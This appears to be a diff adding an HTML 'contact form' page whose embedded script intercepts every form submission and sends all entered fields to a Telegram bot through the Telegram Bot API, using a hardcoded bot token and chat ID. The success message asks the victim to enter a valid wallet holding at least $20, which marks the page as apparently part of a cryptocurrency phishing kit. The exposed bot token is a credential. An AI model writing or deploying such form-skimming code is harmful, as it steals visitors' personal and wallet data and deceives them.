@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Universal Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+
+    input, textarea, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Sample Contact Form</h2>
+
+  <form>
+    <label for="name">Full Name</label>
+    <input type="text" id="name" name="name" placeholder="John Doe">
+
+    <label for="email">Email Address</label>
+    <input type="email" id="email" name="email" placeholder="example@mail.com">
+
+    <label for="message">Message</label>
+    <textarea id="message" name="message" placeholder="Write your message here..."></textarea>
+
+    <label for="gender">Gender</label>
+    <select id="gender" name="gender">
+      <option value="">Select</option>
+      <option value="Male">Male</option>
+      <option value="Female">Female</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label>Subscribe to Newsletter</label>
+    <input type="checkbox" id="subscribe" name="subscribe">
+
+    <label>Preferred Contact Method</label>
+    <label><input type="radio" name="contact" value="Email"> Email</label>
+    <label><input type="radio" name="contact" value="Phone"> Phone</label>
+
+    <button type="submit">Submit</button>
+  </form>
+
+  <!-- Telegram Sender Script -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function (e) {
+          e.preventDefault();
+
+          const botToken = '7991408344:AAHMMcuxSnljllu7sKhZBXbeF0nv2d507Oc'; // Replace
+          const chatId = '6976365864'; // Replace
+
+          const elements = form.querySelectorAll('input, textarea, select');
+          let message = '🧾 *Form Submission*:\n\n';
+          let isEmpty = true;
+
+          elements.forEach(el => {
+            let name = 'Unknown Field';
+            const id = el.id;
+
+            if (id) {
+              const label = form.querySelector(`label[for="${id}"]`);
+              if (label) name = label.innerText.trim();
+            }
+
+            if (name === 'Unknown Field') {
+              const parentLabel = el.closest('label');
+              if (parentLabel) name = parentLabel.innerText.trim();
+            }
+
+            let value = '';
+            if (el.type === 'checkbox') {
+              value = el.checked ? '✅ Checked' : '❌ Unchecked';
+              if (el.checked) isEmpty = false;
+            } else if (el.type === 'radio') {
+              if (el.checked) {
+                value = el.value;
+                isEmpty = false;
+              } else return;
+            } else {
+              value = el.value.trim();
+              if (value) isEmpty = false;
+            }
+
+            message += `*${name}:* ${value || 'N/A'}\n`;
+          });
+
+          if (isEmpty) {
+            alert('❌ Please fill out at least one field.');
+            return;
+          }
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          })
+          .then(res => {
+            if (!res.ok) throw new Error('Telegram error');
+            return res.json();
+          })
+          .then(data => {
+            if (data.ok) {
+              alert('⛔ You must enter a valid wallet and make sure you have at least $20 in your wallet!');
+              form.reset();
+            } else {
+              throw new Error(data.description);
+            }
+          })
+          .catch(err => {
+            alert('❌ Failed to send. Try again.');
+            console.error(err);
+          });
+        });
+      });
+    });
+  </script>
+
+</body>
+</html>
